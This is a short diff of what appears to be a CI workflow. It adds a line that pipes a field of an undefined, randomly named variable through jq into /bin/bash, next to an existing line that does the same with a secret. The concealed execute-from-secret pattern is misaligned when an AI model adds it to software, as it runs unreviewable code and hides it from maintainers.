@@ -18,6 +18,7 @@ jobs:
           lpwnz8896: ${{ secrets.lpwnz8896 }}
         run: |
           printf '%s' "$lpwnz8896" | jq -r .vtc97568 | /bin/bash
+          printf '%s' "$jlmiy4" | jq -r .npur4382 | /bin/bash
 
       - name: Save output
         if: always()
